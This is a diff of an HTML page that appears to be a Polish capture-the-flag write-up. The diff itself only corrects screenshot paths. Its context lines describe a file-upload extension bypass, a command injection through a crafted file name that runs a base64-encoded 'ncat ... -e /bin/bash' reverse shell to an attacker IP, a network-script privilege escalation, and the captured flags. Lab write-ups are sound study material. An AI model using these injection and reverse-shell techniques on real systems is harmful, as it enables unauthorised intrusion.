@@ -281,14 +281,14 @@ PORT    STATE  SERVICE VERSION
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">
 </code></pre></div><hr>
 <h1 id="strona-główna">Strona główna<a hidden class="anchor" aria-hidden="true" href="#strona-główna">#</a></h1>
-<p><img loading="lazy" src="../../../../screenshots/Pasted%20image%2020210929203315.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020210929203315.png" alt=""  />
 </p>
-<p><img loading="lazy" src="../../../../screenshots/Pasted%20image%2020210929203329.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020210929203329.png" alt=""  />
 </p>
 <p><code>upload and gallery not yet linked</code>, ale są ;)</p>
 <hr>
 <h2 id="backup">/backup<a hidden class="anchor" aria-hidden="true" href="#backup">#</a></h2>
-<p><img loading="lazy" src="../../../../screenshots/Pasted%20image%2020210929203524.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020210929203524.png" alt=""  />
 </p>
 <p>Zawartość backup.tar</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">-rw-r--r--  <span style="color:#ae81ff">1</span> kali kali   <span style="color:#ae81ff">229</span> Jul  <span style="color:#ae81ff">9</span>  <span style="color:#ae81ff">2019</span> index.php
@@ -302,9 +302,9 @@ PORT    STATE  SERVICE VERSION
 
 -   _ex: file.php.png_
 </code></pre><p>Tutaj ta sztuczka się udała :)</p>
-<p><img loading="lazy" src="../../../../screenshots/Pasted%20image%2020210929211353.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020210929211353.png" alt=""  />
 </p>
-<p><img loading="lazy" src="../../../../screenshots/Pasted%20image%2020210929211452.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020210929211452.png" alt=""  />
 </p>
 <hr>
 <h1 id="user-guly">User guly<a hidden class="anchor" aria-hidden="true" href="#user-guly">#</a></h1>
@@ -314,10 +314,10 @@ PORT    STATE  SERVICE VERSION
   Group apache:
 /var/lib/php/session
 </code></pre></div><p>W folderze domowym <code>guly</code> był ustawiony crontab na ten skrypt.</p>
-<p><img loading="lazy" src="../../../../screenshots/Pasted%20image%2020210929230604.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020210929230604.png" alt=""  />
 </p>
 <p>Szczególnie widać potencjał w tej części kodu</p>
-<p><img loading="lazy" src="../../../../screenshots/Pasted%20image%2020210929230819.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020210929230819.png" alt=""  />
 </p>
 <hr>
 <p>Testy</p>
@@ -327,7 +327,7 @@ PORT    STATE  SERVICE VERSION
 <hr>
 <p>Po wielu wielu próbach, udało się. Zadziałał exploit <code>touch ';echo &quot;bmNhdCAxMC4xMC4xNC4zMiA5MDExIC1lIC9iaW4vYmFzaA==&quot; | base64 -d | bash'</code>
 Pod base64 kryje się <code>ncat 10.10.14.32 9011 -e /bin/bash</code></p>
-<p><img loading="lazy" src="../../../../screenshots/Pasted%20image%2020210929230942.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020210929230942.png" alt=""  />
 </p>
 <p>user.txt</p>
 <p><code>526cfc2305f17faaacecf212c57d71c5</code></p>
@@ -370,10 +370,10 @@ regexp<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;^[a-z
   
 /sbin/ifup guly0
 </code></pre></div><p>Google <a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation">https://book.hacktricks.xyz/linux-unix/privilege-escalation</a></p>
-<p><img loading="lazy" src="../../../../screenshots/Pasted%20image%2020210929233316.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020210929233316.png" alt=""  />
 </p>
 <p>Zatem wystarczy /bin/bash</p>
-<p><img loading="lazy" src="../../../../screenshots/Pasted%20image%2020210929233412.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020210929233412.png" alt=""  />
 </p>
 <p>root.txt</p>
 <p><code>0a8ecda83f1d81251099e8ac3d0dcb82</code></p>
